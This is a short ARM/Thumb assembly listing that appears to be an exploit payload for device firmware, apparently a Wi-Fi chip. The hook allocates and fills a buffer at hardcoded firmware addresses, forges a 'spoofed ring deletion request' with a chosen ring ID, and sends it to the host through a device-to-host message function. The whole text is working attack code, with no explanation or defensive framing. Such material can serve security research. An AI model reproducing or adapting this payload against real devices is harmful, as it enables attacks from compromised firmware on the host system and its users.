.code 16
  PUSH {R0}
  ADR R0, hook_arm
  BX R0

.code 32
.align 4
hook_arm:
  POP {R0}

  PUSH {R4-R11, LR}

  LDR R11, ctx          //context

  //Sending a spoofed ring deletion request
  LDR R4, malloc
  MOV R0, #0x18 
  BLX R4
  MOV R10, R0           //buffer

  LDR R4, memset
  MOV R0, R10
  MOV R1, #0
  MOV R2, #0x18
  BLX R4

  MOV R0, #6
  STRB R0, [R10, #0x0]  //msg type
  LDR R0, ring_id
  STRH R0, [R10, #0xA]  //ring ID

  LDR R4, send_d2h_message
  MOV R0, R11
  MOV R1, R10
  BLX R4

  LDR R4, free
  MOV R0, R10
  BLX R4

  //Returning zero
  MOV R0, #0
  POP {R4-R11, PC}

.align 4

ring_id:
  .word 0xBEEF0101

ctx:
  .word 0x201A70

malloc:
  .word 0x2F0A4+1

memset:
  .word 0x3EB4+1

send_d2h_message:
  .word 0x150A4+1

free:
  .word 0x2F0C8+1
